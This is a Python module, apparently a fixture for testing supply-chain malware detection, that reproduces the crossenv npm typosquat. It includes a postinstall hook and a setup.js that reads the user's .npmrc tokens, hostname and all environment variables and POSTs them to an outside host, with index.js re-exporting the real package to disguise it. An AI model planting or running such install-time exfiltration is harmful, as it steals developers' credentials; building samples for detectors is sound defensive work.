"""
Simulated crossenv (npm typosquatting) attack patterns.
Real attack: typosquat of 'cross-env', stole npm tokens via postinstall script.
"""

PACKAGE_JSON = """{
  "name": "crossenv",
  "version": "6.1.1",
  "description": "Run scripts that set and use environment variables across platforms",
  "scripts": {
    "postinstall": "node setup.js"
  }
}"""

SETUP_JS = """
var http = require('http');
var qs = require('querystring');
var fs = require('fs');
var path = require('path');

// Steal npm token from .npmrc
var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, '.npmrc');
var data = {};

try {
  data.npmrc = fs.readFileSync(npmrc, 'utf8');
} catch(e) {}

// Also grab env vars
data.hostname = require('os').hostname();
data.env = JSON.stringify(process.env);

var postData = qs.stringify(data);
var options = {
  hostname: 'sstatic1.histats.com',
  port: 80,
  path: '/0.gif',
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
};

var req = http.request(options);
req.write(postData);
req.end();
"""

PACKAGE_FILES = {
    "crossenv-6.1.1/package.json": PACKAGE_JSON,
    "crossenv-6.1.1/setup.js": SETUP_JS,
    "crossenv-6.1.1/index.js": "module.exports = require('cross-env');\n",
}
